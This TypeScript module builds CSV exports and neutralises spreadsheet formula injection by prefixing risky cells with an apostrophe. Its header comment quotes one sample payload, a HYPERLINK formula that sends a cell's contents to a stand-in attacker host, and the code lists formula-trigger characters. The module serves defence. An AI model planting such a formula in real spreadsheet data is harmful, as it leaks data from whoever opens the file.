/**
 * CSV writing that is safe to open in a spreadsheet.
 *
 * All three exporters previously escaped only the RFC 4180 delimiters - quote,
 * comma, newline - which makes a well-formed CSV but not a safe one. Excel,
 * LibreOffice and Google Sheets treat a cell beginning with `=`, `+`, `-` or
 * `@` as a formula, so a participant who enters a business name of
 * `=HYPERLINK("http://attacker/"&A1,"Click")` has that formula evaluated on the
 * machine of whoever opens the export.
 *
 * These files go to funders. The person opening them is the least likely in the
 * chain to be expecting it, so the escaping happens here rather than being left
 * to each call site.
 */

/** Characters a spreadsheet reads as the start of a formula. */
const FORMULA_PREFIXES = ['=', '+', '-', '@']

/**
 * Characters that some spreadsheets strip before evaluating, so a payload can
 * hide behind them.
 */
const LEADING_CONTROL = ['\t', '\r']

/** Neutralise a value that a spreadsheet would otherwise execute. */
export function neutralise(value: string): string {
  if (value.length === 0) return value

  const first = value[0]
  const dangerous =
    FORMULA_PREFIXES.includes(first) || LEADING_CONTROL.includes(first)

  // A leading apostrophe makes the cell literal text in every major
  // spreadsheet, and is stripped on display.
  return dangerous ? `'${value}` : value
}

/** Quote and escape one cell, neutralising formulas first. */
export function csvCell(value: unknown): string {
  const text = value === null || value === undefined ? '' : String(value)
  const safe = neutralise(text)
  return `"${safe.replace(/"/g, '""')}"`
}

/** Build a full CSV document from a header row and data rows. */
export function toCsv(headers: string[], rows: unknown[][]): string {
  const lines = [
    headers.map(csvCell).join(','),
    ...rows.map((row) => row.map(csvCell).join(',')),
  ]
  // A BOM so Excel reads the file as UTF-8 rather than the local codepage,
  // which otherwise mangles South African place and person names.
  return '﻿' + lines.join('\r\n')
}

/** Build a CSV from an array of flat objects, using their keys as headers. */
export function objectsToCsv(rows: Record<string, unknown>[]): string {
  if (rows.length === 0) return ''
  const headers = Object.keys(rows[0])
  return toCsv(
    headers,
    rows.map((row) => headers.map((h) => row[h]))
  )
}
